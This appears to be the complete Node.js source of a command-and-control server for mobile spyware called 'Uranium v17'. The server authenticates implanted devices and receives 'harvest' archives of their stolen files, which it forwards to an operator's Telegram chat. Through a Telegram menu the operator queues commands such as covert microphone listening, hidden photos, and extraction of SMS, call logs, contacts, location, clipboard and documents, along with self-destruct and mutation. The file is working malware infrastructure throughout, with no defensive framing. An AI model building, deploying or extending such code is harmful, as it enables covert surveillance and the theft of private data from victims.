// =========================================================================
// Uranium v17 — aligned C2 server
// Node 20 LTS · express 4 · sqlite3 5 · node-telegram-bot-api 0.6x
// Contract: stream JSON {type,data}, upload_raw bytes, HMAC-SHA256 auth
// =========================================================================
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();

const TOKEN    = process.env.TG_TOKEN;
const CHAT_ID  = process.env.TG_ID;
const NODE_KEY = process.env.NODE_HMAC_KEY;

if (!TOKEN || !CHAT_ID || !NODE_KEY) {
  console.error('missing env: TG_TOKEN / TG_ID / NODE_HMAC_KEY');
  process.exit(1);
}
if (!/^[0-9a-fA-F]{64}$/.test(NODE_KEY)) {
  console.error('NODE_HMAC_KEY must be 64 hex chars (openssl rand -hex 32)');
  process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v17.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS nodes (
    id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
  db.run(`CREATE TABLE IF NOT EXISTS tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT,
    payload TEXT, status TEXT DEFAULT 'PENDING',
    created_at INTEGER DEFAULT (strftime('%s','now')))`);
});

const app = express();
const bot = new telegramBot(TOKEN, { polling: true });
bot.on('polling_error', e => {
  if (!(e.code === 'ETELEGRAM' && e.message.includes('409 Conflict')))
    console.log(`[tg] ${e.code}: ${e.message}`);
});

// ── crypto: HKDF + HMAC, matching the implant ─────────────────────────
const MASTER = Buffer.from(NODE_KEY, 'hex');
const keyForNode = id =>
  Buffer.from(crypto.hkdfSync('sha256', MASTER, Buffer.from(id), Buffer.from('uranium-v17'), 32));

function auth(req, res, next) {
  const id  = req.header('x-node-id');
  const ts  = req.header('x-timestamp');
  const sig = req.header('x-signature');
  if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
  const now = Math.floor(Date.now() / 1000);
  if (!Number.isFinite(Number(ts)) || Math.abs(now - Number(ts)) > 300)
    return res.status(401).json({ status: 'CLOCK_SKEW' });

  const body = Buffer.isBuffer(req.body) ? req.body
    : Buffer.from(req.body !== undefined ? JSON.stringify(req.body) : '');
  const bodyHash = crypto.createHash('sha256').update(body).digest('hex');
  const msg = `${id}:${ts}:${bodyHash}`;
  const mac = crypto.createHmac('sha256', keyForNode(id)).update(msg).digest('hex');

  let a, b;
  try { a = Buffer.from(mac, 'hex'); b = Buffer.from(sig, 'hex'); }
  catch { return res.status(401).json({ status: 'SIG_FORMAT' }); }
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b))
    return res.status(401).json({ status: 'SIG_BAD' });

  req.nodeId = id;
  next();
}

// raw body must be captured BEFORE JSON parse for correct hashing
app.use('/api/v3/uranium/upload_raw',
  express.raw({ type: 'application/octet-stream', limit: '200mb' }),
  (req, _res, next) => { req.bodyBuffer = req.body; next(); });

// json body for stream — capture raw string too so hash is exact-bytes
app.use('/api/v3/uranium/stream',
  express.text({ type: 'application/json', limit: '4mb' }),
  (req, _res, next) => {
    const raw = typeof req.body === 'string' ? req.body : '';
    try { req.body = JSON.parse(raw); req.rawBody = raw; }
    catch { req.body = null; req.rawBody = raw; }
    next();
  });

app.use(express.json({ limit: '4mb' }));

// ── telegram ──────────────────────────────────────────────────────────
const sendTg = (msg, opts = {}) =>
  bot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...opts })
     .catch(e => console.error('tg:', e.message));

async function sendTgDocumentSmart(filePath, caption) {
  if (!fs.existsSync(filePath)) return;
  const size = fs.statSync(filePath).size;
  const LIMIT = 45 * 1024 * 1024;
  if (size <= LIMIT) {
    return bot.sendDocument(CHAT_ID, filePath, { caption })
      .catch(() => sendTg(`⚠️ send failed, stored at <code>${path.basename(filePath)}</code> (${(size/1048576).toFixed(2)} MB)`));
  }
  await sendTg(`📦 <b>${path.basename(filePath)}</b> is ${(size/1048576).toFixed(2)} MB — chunking.`);
  const fd = fs.openSync(filePath, 'r');
  const buf = Buffer.alloc(LIMIT);
  let part = 1, n;
  while ((n = fs.readSync(fd, buf, 0, LIMIT, null)) > 0) {
    const p = `${filePath}.part${String(part).padStart(3, '0')}`;
    fs.writeFileSync(p, buf.subarray(0, n));
    await bot.sendDocument(CHAT_ID, p, { caption: `${caption} — part ${part}` }).catch(() => {});
    fs.unlinkSync(p);
    part++;
  }
  fs.closeSync(fd);
}

// ── endpoints ─────────────────────────────────────────────────────────
app.get('/', (_q, res) => res.type('html').send(
  `<html><body style="background:#000;color:#0f6;font-family:monospace;text-align:center;padding-top:50px">
   <h1>[☢️] URANIUM C2 v17 ONLINE [☢️]</h1>
   <p>stream: /api/v3/uranium/stream · ingest: /api/v3/uranium/upload_raw</p>
   </body></html>`));

app.post('/api/v3/uranium/stream',
  (req, _res, next) => { req.body = req.rawBody; next(); },
  (req, res, next) => {
    // hash the exact raw text the client signed
    const id = req.header('x-node-id');
    const ts = req.header('x-timestamp');
    const sig = req.header('x-signature');
    if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
    const now = Math.floor(Date.now() / 1000);
    if (Math.abs(now - Number(ts)) > 300) return res.status(401).json({ status: 'CLOCK_SKEW' });
    const bodyHash = crypto.createHash('sha256')
      .update(req.rawBody || '').digest('hex');
    const mac = crypto.createHmac('sha256', keyForNode(id))
      .update(`${id}:${ts}:${bodyHash}`).digest('hex');
    if (mac.length !== sig.length ||
        !crypto.timingSafeEqual(Buffer.from(mac,'hex'), Buffer.from(sig,'hex')))
      return res.status(401).json({ status: 'SIG_BAD' });
    req.nodeId = id;
    next();
  },
  (req, res) => {
    const { nodeId } = req;
    const model = req.header('x-node-model') || 'unknown';
    db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`,
           [nodeId, model, Date.now()]);
    const payload = req.body || {};
    if (payload.type === 'TEXT_REPORT' && typeof payload.data === 'string' && payload.data.length > 2) {
      const safe = payload.data.slice(0, 3800)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
      sendTg(`☢ <b>node <code>${nodeId}</code>:</b>\n<pre>${safe}</pre>`);
    }
    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id LIMIT 1`,
           [nodeId], (err, row) => {
      if (err) return res.status(500).json({ status: 'SERVER_ERROR' });
      if (!row) return res.json({ status: 'ACK', task: null });
      db.run(`UPDATE tasks SET status='SENT' WHERE id=?`, [row.id]);
      res.json({ status: 'ACK', task: {
        id: row.id, action: row.action,
        payload: JSON.parse(row.payload || '{}'),
      }});
    });
  });

app.post('/api/v3/uranium/upload_raw', (req, res, next) => {
  const id = req.header('x-node-id');
  const ts = req.header('x-timestamp');
  const sig = req.header('x-signature');
  if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - Number(ts)) > 300) return res.status(401).json({ status: 'CLOCK_SKEW' });
  const body = req.bodyBuffer || Buffer.alloc(0);
  const bodyHash = crypto.createHash('sha256').update(body).digest('hex');
  const mac = crypto.createHmac('sha256', keyForNode(id))
    .update(`${id}:${ts}:${bodyHash}`).digest('hex');
  if (mac.length !== sig.length ||
      !crypto.timingSafeEqual(Buffer.from(mac,'hex'), Buffer.from(sig,'hex')))
    return res.status(401).json({ status: 'SIG_BAD' });
  req.nodeId = id;
  next();
}, async (req, res) => {
  const { nodeId } = req;
  const model = req.header('x-node-model') || 'unknown';
  const fileName = path.basename(req.header('x-file-name') || `archive_${Date.now()}.bin`);
  const bytes = req.bodyBuffer || Buffer.alloc(0);
  if (!bytes.length) return res.status(400).json({ status: 'EMPTY' });
  db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`,
         [nodeId, model, Date.now()]);
  const out = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${fileName}`);
  fs.writeFileSync(out, bytes);
  await sendTg(`☢️ <b>harvest</b> from <code>${nodeId}</code>: <code>${fileName}</code> (${(bytes.length/1048576).toFixed(2)} MB)`);
  await sendTgDocumentSmart(out, `☠️ archive: <code>${fileName}</code>`);
  res.json({ status: 'OK' });
});

// ── telegram UI ───────────────────────────────────────────────────────
const ACTIONS = [
  'MIC_AI_LISTEN','MICRO_BURST_SNAP','STEALTH_BLACKOUT','GEO_FENCE_ALERT',
  'SELF_DESTRUCT','POLY_MUTATE','WIFI_AUTOPILOT','STORAGE_AUDIT',
  'PROC_DCIM','PROC_DOWNLOAD','PROC_PICTURES','PROC_DOCUMENTS',
  'EXTRACT_SMS','EXTRACT_CALLS','EXTRACT_CONTACTS','EXTRACT_LOCATION',
  'EXTRACT_APPS','EXTRACT_CLIPBOARD',
];

const sendMenu = (chatId, msgId) => {
  db.all(`SELECT id, model FROM nodes`, (err, rows) => {
    const kb = (rows && rows.length)
      ? rows.map(n => [{ text: `☢️ ${n.model} (${n.id.slice(0,6)})`,
                          callback_data: `menu_${n.id}` }])
      : [];
    const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } };
    if (msgId) bot.editMessageText('pick a node:', { chat_id: chatId, message_id: msgId, ...opts }).catch(() => {});
    else bot.sendMessage(chatId, 'pick a node:', opts).catch(() => {});
  });
};

bot.on('message', async (msg) => {
  if (String(msg.chat.id) !== String(CHAT_ID)) return;
  if (msg.text === '/start') sendMenu(msg.chat.id);
});

bot.on('callback_query', async (q) => {
  const parts = q.data.split('_');
  if (parts[0] === 'menu') {
    const nodeId = parts.slice(1).join('_');
    const kb = {
      inline_keyboard: [
        ...ACTIONS.map(a => ([{ text: a.replace(/_/g,' '),
                                callback_data: `cmd_${a}_${nodeId}` }])),
        [{ text: '⬅ home', callback_data: 'home' }],
      ],
    };
    bot.editMessageText(`node <code>${nodeId}</code>`, {
      chat_id: q.message.chat.id, message_id: q.message.message_id,
      parse_mode: 'HTML', reply_markup: kb,
    }).catch(() => {});
  } else if (parts[0] === 'cmd') {
    const nodeId = parts.pop();
    const action = parts.slice(1).join('_');
    db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`,
      [nodeId, action], () => {
        bot.answerCallbackQuery(q.id, { text: `fired ${action}` }).catch(() => {});
        sendTg(`⚡ <b>${action}</b> queued for <code>${nodeId}</code>`);
      });
  } else if (q.data === 'home') {
    sendMenu(q.message.chat.id, q.message.message_id);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () =>
  console.log(`[+] uranium v17 aligned on :${PORT}`));
